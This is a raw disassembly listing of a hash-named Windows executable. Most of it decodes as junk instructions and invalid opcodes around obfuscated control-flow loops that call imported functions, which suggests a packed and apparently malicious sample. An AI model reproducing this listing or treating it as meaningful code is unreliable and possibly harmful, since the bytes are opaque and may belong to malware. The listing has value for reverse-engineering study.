
10dabd6539131c6e336b86ea90d45fbc2758e2b37b789783cfb8bec21d660949.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43355b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4335f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4335a7
  401023:	or     DWORD PTR ds:0x433553,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433543,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [edx+0x1],ecx
  401049:	mov    al,0xfa
  40104b:	jl     0x4010c9
  40104d:	jl     0x4010cb
  40104f:	addr16 jle 0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    eax,DWORD PTR [edx]
  401060:	inc    ebx
  401061:	add    cl,BYTE PTR [edi]
  401063:	xor    ecx,DWORD PTR [edi]
  401065:	ret    0xc71a
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0x874e:0xa03ea6ce
  4010ff:	cmc    
  401100:	clc    
  401101:	test   ah,bl
  401103:	fcomp  QWORD PTR [edx+edi*8-0x4f3693d4]
  40110a:	das    
  40110b:	nop
  40110c:	dec    ecx
  40110d:	jmp    0x75c7:0xfdfabe1e
  401114:	jmp    0xc029:0x337d26c9
  40111b:	push   edx
  40111c:	mov    edi,0x835545fd
  401121:	pushf  
  401122:	and    ah,dh
  401124:	or     eax,0x9443d575
  401129:	ins    DWORD PTR es:[edi],dx
  40112a:	sub    ch,BYTE PTR [eax+0x71aa4572]
  401130:	and    ch,BYTE PTR ds:0xf3886f20
  401136:	dec    ebx
  401137:	fistp  DWORD PTR [edx-0x18]
  40113a:	ror    ebp,cl
  40113c:	adc    al,0xac
  40113e:	(bad)  
  40113f:	mov    bl,0xce
  401141:	add    ebx,eax
  401143:	(bad)  
  401145:	retf   
  401146:	jp     0x40112f
  401148:	out    0xba,al
  40114a:	mov    al,0xe8
  40114c:	mov    al,ds:0xf76d2fd4
  401151:	jmp    0x944b:0x7dddd0bd
  401158:	sub    eax,0xf506e19b
  40115d:	push   ecx
  40115e:	mov    esi,0xc39a1c0f
  401163:	xchg   edi,eax
  401164:	push   ds
  401165:	push   ebx
  401166:	call   FWORD PTR [edi-0x7c4efa22]
  40116c:	xor    esi,eax
  40116e:	leave  
  40116f:	pop    ds
  401170:	or     DWORD PTR [edi-0x77],eax
  401173:	mov    dh,BYTE PTR [ebp-0x751c81d6]
  401179:	loop   0x401190
  40117b:	xchg   BYTE PTR [ecx+0x56],bh
  40117e:	pop    ecx
  40117f:	aaa    
  401180:	sub    esi,edx
  401182:	adc    al,0x4f
  401184:	loop   0x40118d
  401186:	lahf   
  401187:	ins    DWORD PTR es:[edi],dx
  401188:	addr16 xchg edx,eax
  40118a:	jmp    0x868:0x1055966c
  401191:	mov    esp,DWORD PTR [ebp-0x26]
  401194:	and    al,0xd2
  401196:	inc    eax
  401197:	not    BYTE PTR [eax-0x31a1e8d2]
  40119d:	aaa    
  40119e:	gs in  eax,0xeb
  4011a1:	adc    edx,DWORD PTR [ebp-0xb]
  4011a4:	mov    esp,0xc0f0a6ef
  4011a9:	scas   eax,DWORD PTR es:[edi]
  4011aa:	push   ebx
  4011ab:	(bad)  
  4011ac:	xchg   ecx,eax
  4011ad:	ret    
  4011ae:	lahf   
  4011af:	div    DWORD PTR [edi+0x335d37e2]
  4011b5:	sub    BYTE PTR [eax],ch
  4011b7:	mov    DWORD PTR [edx+0x1a],edi
  4011ba:	push   esi
  4011bb:	adc    edx,DWORD PTR [ecx-0x533d5ea8]
  4011c1:	out    0x1e,eax
  4011c3:	or     DWORD PTR [esi],ebx
  4011c5:	std    
  4011c6:	push   ss
  4011c7:	fst    DWORD PTR [edx]
  4011c9:	icebp  
  4011ca:	shr    ah,1
  4011cc:	in     al,dx
  4011cd:	fwait
  4011ce:	add    DWORD PTR [esi],esp
  4011d0:	jnp    0x40124d
  4011d2:	gs cmp eax,0x4463b3eb
  4011d8:	xchg   BYTE PTR [esi-0x5d],dl
  4011db:	mov    dh,0x29
  4011dd:	(bad)
  4011e0:	dec    ecx
  4011e1:	imul   esi,DWORD PTR [ebx],0xaaae0881
  4011e7:	or     al,0x9c
  4011e9:	push   0x67
  4011eb:	inc    ecx
  4011ec:	jp     0x401185
  4011ee:	sahf   
  4011ef:	inc    edi
  4011f0:	lahf   
  4011f1:	ins    BYTE PTR es:[edi],dx
  4011f2:	mov    bh,0xad
  4011f4:	sbb    bh,BYTE PTR [ebp+0x561c9e30]
  4011fa:	jg     0x401205
  4011fc:	popa   
  4011fd:	fucom  st(7)
  4011ff:	sbb    eax,0x86c101d8
  401204:	clc    
  401205:	pop    eax
  401206:	push   ebx
  401207:	dec    ebp
  401208:	daa    
  401209:	shr    BYTE PTR [edx+0x10],1
  40120c:	mov    cl,BYTE PTR [eax]
  40120e:	pushf  
  40120f:	jbe    0x401239
  401211:	(bad)  
  401212:	mul    BYTE PTR [eax]
  401214:	or     BYTE PTR [ebx+0x12],0x33
  401218:	cmp    edi,DWORD PTR [esi-0x738408a8]
  40121e:	icebp  
  40121f:	fisub  DWORD PTR [esp+ebx*2+0x338b6a37]
  401226:	sbb    BYTE PTR [edi],al
  401228:	sar    DWORD PTR [eax+0x14],1
  40122b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40122c:	and    dl,0xba
  40122f:	mul    BYTE PTR [esi-0x54]
  401232:	and    eax,ebp
  401234:	pop    edi
  401235:	add    edi,DWORD PTR [ebx]
  401237:	ins    DWORD PTR es:[edi],dx
  401238:	lea    ebp,[esi]
  40123a:	lsl    edi,WORD PTR [ebp-0x1c9c6d4c]
  401241:	arpl   cx,ax
  401243:	jl     0x401200
  401245:	jmp    0x5389873b
  40124a:	jne    0x401284
  40124c:	inc    edx
  40124d:	das    
  40124e:	pop    es
  40124f:	jne    0x401291
  401251:	xor    BYTE PTR [edx],bl
  401253:	aam    0x88
  401255:	sbb    eax,0x8f08425b
  40125a:	in     al,0xe0
  40125c:	mov    dh,0x2f
  40125e:	cmc    
  40125f:	dec    ebp
  401260:	and    DWORD PTR [edi+esi*2],esi
  401263:	iret   
  401264:	fs cli 
  401266:	(bad)  
  401268:	retf   0x2057
  40126b:	xor    al,0x8d
  40126d:	jne    0x4012d7
  40126f:	or     BYTE PTR [ebp-0x18674198],bh
  401275:	mov    edx,0x2824f0ee
  40127a:	add    al,0x3e
  40127c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127d:	sti    
  40127e:	aaa    
  40127f:	fwait
  401280:	mov    cl,0x9f
  401282:	inc    si
  401284:	inc    esp
  401285:	fadd   st,st(6)
  401287:	pop    es
  401288:	cli    
  401289:	add    DWORD PTR [esp+ecx*8+0x46d4d77b],esi
  401290:	pop    ebp
  401291:	and    DWORD PTR [esi],ebx
  401293:	cld    
  401294:	sbb    eax,DWORD PTR [ecx+edi*1]
  401297:	in     al,dx
  401298:	mov    ebp,?
  40129a:	or     eax,0xc799ce13
  40129f:	fxch   st(3)
  4012a1:	or     eax,0xc60c953
  4012a6:	add    DWORD PTR [eax],esi
  4012a8:	cmc    
  4012a9:	jp     0x4012ee
  4012ab:	and    dl,BYTE PTR [ebp+0x38]
  4012ae:	imul   BYTE PTR [ebp+0x6b]
  4012b1:	and    ecx,DWORD PTR [edi+0x4dd20849]
  4012b7:	cmp    ch,ah
  4012b9:	inc    ebp
  4012ba:	loope  0x40124e
  4012bc:	mov    BYTE PTR [ecx-0x31],ah
  4012bf:	and    ebx,DWORD PTR [edx-0x1]
  4012c2:	das    
  4012c3:	lahf   
  4012c4:	nop
  4012c5:	(bad)  
  4012c6:	loope  0x4012b8
  4012c8:	fs ds enter 0x17e,0xac
  4012ce:	in     eax,dx
  4012cf:	arpl   di,cx
  4012d1:	ins    DWORD PTR es:[edi],dx
  4012d2:	aam    0x17
  4012d4:	jb     0x401341
  4012d6:	mov    al,0xd4
  4012d8:	cwde   
  4012d9:	pop    ss
  4012da:	push   edi
  4012db:	aas    
  4012dc:	out    0x82,al
  4012de:	sbb    al,0x73
  4012e0:	jmp    0xa99f:0x2fb05b2f
  4012e7:	jns    0x401278
  4012e9:	shr    DWORD PTR [edi+0x7c3192e4],1
  4012ef:	scas   eax,DWORD PTR es:[edi]
  4012f0:	ret    
  4012f1:	out    0x57,al
  4012f3:	xlat   BYTE PTR ds:[ebx]
  4012f4:	loop   0x4012ef
  4012f6:	push   ss
  4012f7:	dec    esp
  4012f8:	es dec edx
  4012fa:	cmp    BYTE PTR [edi],cl
  4012fc:	sbb    BYTE PTR [eax+0x5d],al
  4012ff:	push   edi
  401300:	lahf   
  401301:	lea    edx,[esi-0x5c]
  401304:	retf   0xf490
  401307:	dec    esi
  401308:	in     al,dx
  401309:	test   al,0xc3
  40130b:	cli    
  40130c:	lods   al,BYTE PTR ds:[esi]
  40130d:	fnstsw WORD PTR [eax-0x34]
  401310:	mov    edx,0x8dacf6f0
  401315:	jne    0x4012f1
  401317:	mov    ah,0x36
  401319:	xor    edi,DWORD PTR [eax+0x79]
  40131c:	add    DWORD PTR [ebx+0x4220eb6],esp
  401322:	ins    DWORD PTR es:[edi],dx
  401323:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  401325:	repnz adc BYTE PTR [ebx+0x7],al
  401329:	sti    
  40132a:	jo     0x4012bc
  40132c:	lods   eax,DWORD PTR ds:[esi]
  40132d:	(bad)  
  40132e:	xor    eax,0x2c3d527b
  401333:	add    eax,0x17769f57
  401338:	stos   DWORD PTR es:[edi],eax
  401339:	add    al,0xd1
  40133b:	mov    DWORD PTR [ebx+0x4d8b0845],ecx
  401341:	clc    
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x4335a7,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43359b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43361f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43361f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43361f,ebx
  401379:	cmp    DWORD PTR ds:0x43361f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43361f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433563,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43359f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433597,0x19
  4013f7:	cmp    DWORD PTR ds:0x433597,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433597,0xb
  40140b:	jne    0x401421
  401411:	push   0x433553
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433597,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433597
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433597,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433597
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433597,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43354f,0x433543
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433553,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43361b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43361b
  40148e:	inc    eax
  40148f:	mov    ds:0x43361b,eax
  401494:	cmp    DWORD PTR ds:0x43361b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43361b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43361b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43361b,eax
  4014c4:	cmp    DWORD PTR ds:0x43361b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4335df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43355b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43354f,0x43359f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	lea    edx,[edi-0x26]
  401515:	push   0x7c7c7e67
  40151a:	addr16 jle 0x401599
  40151d:	jl     0x40155d
  40151f:	test   dh,ch
  401521:	push   ds
  401522:	addr16 pop edx
  401524:	cmp    bl,BYTE PTR [edi-0x13]
  401527:	or     ecx,eax
  401529:	or     DWORD PTR [ebx],esi
  40152b:	repnz cdq 
  40152d:	dec    ebx
  40152e:	enter  0x1039,0x48
  401532:	dec    ebx
  401533:	retf   
  401534:	jl     0x4014e3
  401536:	xchg   BYTE PTR [eax+edx*1+0x2f],cl
  40153a:	dec    eax
  40153b:	mov    edx,0x19ff48fe
  401540:	shl    esi,1
  401542:	out    0x77,eax
  401544:	ja     0x4014f1
  401546:	mov    esi,0x48a94805
  40154b:	sub    eax,0xee7dc189
  401550:	inc    ecx
  401551:	push   ds
  401552:	pop    ss
  401553:	xchg   edi,eax
  401554:	cmp    al,0xce
  401556:	test   cl,0x26
  401559:	or     ebp,DWORD PTR [edi]
  40155b:	div    esi
  40155d:	adc    al,0x75
  40155f:	jbe    0x4015db
  401561:	and    ah,BYTE PTR [edi+esi*2+0x76af9855]
  401568:	pop    ebp
  401569:	lahf   
  40156a:	(bad)  
  40156b:	xor    DWORD PTR [edx],esp
  40156d:	(bad)  
  40156e:	or     al,0x3e
  401570:	pop    esp
  401571:	dec    edi
  401572:	jle    0x401594
  401574:	scas   al,BYTE PTR es:[edi]
  401575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401576:	aas    
  401577:	or     cl,BYTE PTR [ebp+eax*8+0x6cc42917]
  40157e:	leave  
  40157f:	aad    0xb2
  401581:	inc    edx
  401582:	pop    es
  401583:	test   al,0xad
  401585:	addr16 adc al,0x24
  401588:	jne    0x4015ac
  40158a:	dec    ebp
  40158b:	cld    
  40158c:	add    eax,0xfd721f12
  401591:	sub    ebx,DWORD PTR [edx+0x1fa5d5cd]
  401597:	mov    cl,0x39
  401599:	sub    eax,0x4cbccfe7
  40159e:	adc    eax,0xe3ac3f0d
  4015a3:	add    al,0x2b
  4015a5:	push   ebp
  4015a6:	mov    ?,WORD PTR [ebp-0x23]
  4015a9:	add    esp,DWORD PTR [esi]
  4015ab:	mov    esi,fs
  4015ad:	(bad)  
  4015ae:	sub    al,0xcb
  4015b0:	ror    esi,0xb9
  4015b3:	call   0x2133:0xb1bb4d6b
  4015ba:	sbb    dh,BYTE PTR gs:[ebx]
  4015bd:	or     al,0xb6
  4015bf:	jmp    0xb598:0xc6ebfd2c
  4015c6:	sub    dl,dl
  4015c8:	imul   BYTE PTR [esi+0x51f14ba3]
  4015ce:	sar    DWORD PTR ss:[ecx+eax*4],0x3a
  4015d3:	jns    0x4015ff
  4015d5:	ret    0x818f
  4015d8:	or     al,0x96
  4015da:	fwait
  4015db:	(bad)  
  4015dd:	ins    DWORD PTR es:[edi],dx
  4015de:	mov    ecx,0xbb3be6a
  4015e3:	call   0xfc7c:0x44b87c49
  4015ea:	push   DWORD PTR [edi+0x39]
  4015ed:	cmp    dh,BYTE PTR [ebp-0x6a612c72]
  4015f3:	sti    
  4015f4:	ret    0x5595
  4015f7:	repnz xor dh,cl
  4015fa:	sbb    dl,0x59
  4015fd:	xchg   esp,eax
  4015fe:	popa   
  4015ff:	(bad)  
  401600:	dec    edx
  401601:	repz lea ecx,[eax-0x73]
  401605:	in     eax,0x8
  401607:	fdivr  st,st(4)
  401609:	mov    ds:0xfb8e0d82,al
  40160e:	popa   
  40160f:	pop    edi
  401610:	mov    ch,0x23
  401612:	in     eax,0xc4
  401614:	loop   0x4015a2
  401616:	xchg   esp,eax
  401617:	push   ebp
  401618:	imul   ebp,DWORD PTR [edx+ebp*4-0xd],0xcf6cb22c
  401620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401621:	cmp    BYTE PTR [ebx],cl
  401623:	call   0xf1be:0xc2be1a99
  40162a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40162b:	mov    cs,WORD PTR cs:0x4eaa51a4
  401632:	test   al,0xf1
  401634:	jg     0x401617
  401636:	adc    cl,BYTE PTR [ecx-0x6b1c5069]
  40163c:	ret    0x1fd1
  40163f:	outs   dx,DWORD PTR ds:[esi]
  401640:	data16 imul BYTE PTR [edx+0x66b4e8c7]
  401647:	hlt    
  401648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401649:	sbb    ah,BYTE PTR [ecx-0x1d]
  40164c:	clc    
  40164d:	sbb    edx,ebp
  40164f:	mov    esi,0xe84bb19e
  401654:	pushw  ss
  401656:	scas   eax,DWORD PTR es:[edi]
  401657:	push   0x589cda2a
  40165c:	fdivr  DWORD PTR [ebx-0x16]
  40165f:	fbstp  TBYTE PTR [edi-0x3d]
  401662:	(bad)  
  401663:	shl    esp,1
  401665:	mov    DWORD PTR [edi+0x6a],ecx
  401668:	fs push eax
  40166a:	xor    al,BYTE PTR [edi+0x25f6d4b3]
  401670:	xchg   ebp,ebx
  401672:	outs   dx,BYTE PTR ds:[esi]
  401673:	inc    eax
  401674:	pop    ebp
  401675:	xor    BYTE PTR [ebp-0x7e24c878],0x5d
  40167c:	dec    edx
  40167d:	sbb    BYTE PTR [ecx],bl
  40167f:	mov    dh,0x1d
  401681:	loopne 0x401687
  401683:	add    al,0xb4
  401685:	jbe    0x4016f1
  401687:	cmp    DWORD PTR [ebp-0x64],0xade06aca
  40168e:	out    dx,al
  40168f:	cs add al,0x8
  401692:	mov    dh,0xe7
  401694:	out    dx,eax
  401695:	cmp    eax,0x60318de6
  40169a:	ins    DWORD PTR es:[edi],dx
  40169b:	dec    esi
  40169c:	jne    0x401684
  40169e:	sub    ecx,DWORD PTR [edx-0x2f]
  4016a1:	dec    esi
  4016a2:	xor    eax,0x2d13d496
  4016a7:	in     eax,0xb9
  4016a9:	pop    DWORD PTR [edi]
  4016ab:	sbb    eax,0xb228a3be
  4016b0:	imul   edx,ecx,0xe9273c19
  4016b6:	sub    cl,BYTE PTR [ecx+0x1fe23ea4]
  4016bc:	pushf  
  4016bd:	or     DWORD PTR [edx-0x2353d3af],eax
  4016c3:	dec    edi
  4016c4:	and    BYTE PTR [esi],al
  4016c6:	push   ss
  4016c7:	xlat   BYTE PTR ds:[ebx]
  4016c8:	jne    0x401721
  4016ca:	or     eax,0xb15f6caf
  4016cf:	jne    0x40165c
  4016d1:	inc    edx
  4016d2:	fwait
  4016d3:	dec    esi
  4016d4:	bound  eax,QWORD PTR [esi+0x4c62c3ff]
  4016da:	cmc    
  4016db:	scas   ax,WORD PTR es:[edi]
  4016dd:	push   esp
  4016de:	mov    bh,0x6d
  4016e0:	call   0x328bb50b
  4016e5:	shl    BYTE PTR [edi],1
  4016e7:	and    al,0x14
  4016e9:	popf   
  4016ea:	ror    DWORD PTR [ebx+0x7],0x19
  4016ee:	test   eax,0xf2c93e97
  4016f3:	pop    es
  4016f4:	add    BYTE PTR [edx+edi*8-0x11],ch
  4016f8:	ds aaa 
  4016fa:	mov    edx,0x2eb8198a
  4016ff:	xchg   edi,eax
  401700:	jle    0x40174e
  401702:	add    eax,0x8bf23465
  401707:	aaa    
  401708:	jg     0x401771
  40170a:	cmc    
  40170b:	bound  esp,QWORD PTR [eax]
  40170d:	pushf  
  40170e:	mov    eax,ds:0x36104457
  401713:	stos   BYTE PTR es:[edi],al
  401714:	fcomp  st(3)
  401716:	jmp    0x40173a
  401718:	sub    DWORD PTR [ebp-0x10],edi
  40171b:	ds stc 
  40171d:	adc    ch,BYTE PTR [edx]
  40171f:	push   ebp
  401720:	pop    esp
  401721:	(bad)  
  401722:	imul   edx,DWORD PTR [ebx-0x1],0xffffff88
  401726:	mov    edi,0x6f9678bf
  40172b:	std    
  40172c:	rcl    ch,cl
  40172e:	dec    eax
  40172f:	test   al,0x83
  401731:	arpl   WORD PTR [ebx+0x61a8d112],bp
  401737:	xchg   ecx,eax
  401738:	fdivr  DWORD PTR [edi]
  40173a:	popf   
  40173b:	stos   BYTE PTR es:[edi],al
  40173c:	leave  
  40173d:	sub    eax,0x9e8c03b1
  401742:	loope  0x4016d0
  401744:	mov    ecx,0x911f3dc5
  401749:	jge    0x40178d
  40174b:	xor    eax,0x7e658b8d
  401750:	xchg   edx,eax
  401751:	clc    
  401752:	pop    esp
  401753:	add    ebx,ebp
  401755:	xchg   esp,eax
  401756:	jg     0x401758
  401758:	imul   ah
  40175a:	add    eax,DWORD PTR ds:0x2241425
  401760:	sahf   
  401761:	push   edx
  401762:	cmp    DWORD PTR [esi+0xf],ebp
  401765:	add    ch,BYTE PTR ds:0x8d1e1b4d
  40176b:	out    dx,al
  40176c:	add    ebx,DWORD PTR [esi]
  40176e:	lea    edx,[edi-0x708b219d]
  401774:	xchg   ebp,eax
  401775:	dec    edx
  401776:	fcmovnbe st,st(2)
  401778:	call   0xd86d:0xee1d889d
  40177f:	mov    edi,0xb4eaad29
  401784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401785:	iret   
  401786:	pop    ds
  401787:	jl     0x4017f2
  401789:	ins    BYTE PTR es:[edi],dx
  40178a:	hlt    
  40178b:	in     al,0xd8
  40178d:	hlt    
  40178e:	inc    BYTE PTR ds:0x38ac1382
  401794:	jo     0x40180e
  401796:	(bad)
  40179b:	add    BYTE PTR [ebx],cl
  40179d:	shl    DWORD PTR [edx+0x4d5c975],0xce
  4017a4:	cld    
  4017a5:	inc    edx
  4017a6:	neg    bh
  4017a8:	xchg   esp,eax
  4017a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017aa:	jecxz  0x4017fc
  4017ac:	frstor [esi]
  4017ae:	push   esp
  4017af:	leave  
  4017b0:	loop   0x40177a
  4017b2:	aas    
  4017b3:	lods   al,BYTE PTR ds:[esi]
  4017b4:	pushf  
  4017b5:	jecxz  0x4017b9
  4017b7:	popf   
  4017b8:	mov    ebx,0xbced53a3
  4017bd:	int    0xfb
  4017bf:	loop   0x40181c
  4017c1:	popf   
  4017c2:	mov    dl,0x79
  4017c4:	out    0x28,eax
  4017c6:	or     DWORD PTR [eax],0x47
  4017c9:	ficom  DWORD PTR [eax]
  4017cb:	adc    cl,ah
  4017cd:	ss mov dl,0x8e
  4017d0:	pusha  
  4017d1:	cmp    cl,BYTE PTR [edx]
  4017d3:	ins    DWORD PTR es:[edi],dx
  4017d4:	push   ebx
  4017d5:	push   ebp
  4017d6:	fadd   DWORD PTR [esi]
  4017d8:	dec    ebx
  4017d9:	mov    eax,edi
  4017db:	add    DWORD PTR [edi-0x6c6dc166],esi
  4017e1:	xchg   DWORD PTR [edi+edx*2+0x4d],ecx
  4017e5:	and    dh,BYTE PTR [edx-0x69856956]
  4017eb:	test   eax,0x5f349504
  4017f0:	sub    al,dl
  4017f2:	icebp  
  4017f3:	jle    0x40182c
  4017f5:	inc    esp
  4017f6:	xor    DWORD PTR [ebx+0x790ad5f0],edi
  4017fc:	leave  
  4017fd:	adc    edx,DWORD PTR [edx+0x36]
  401800:	push   ecx
  401801:	fld    QWORD PTR [ecx]
  401803:	jge    0x4017d1
  401805:	mov    ecx,0xa1080300
  40180a:	push   edi
  40180b:	ss inc ebx
  40180d:	add    BYTE PTR [ecx],al
  40180f:	add    eax,0x43354b
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43359b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43359b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433563,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43362f,0x433617
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4335ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4335e7,0x18
  401872:	cmp    DWORD PTR ds:0x4335e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4335e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4335e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4335e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433617,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433617
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433617,edx
  4018db:	cmp    DWORD PTR ds:0x433617,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433617,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43366f
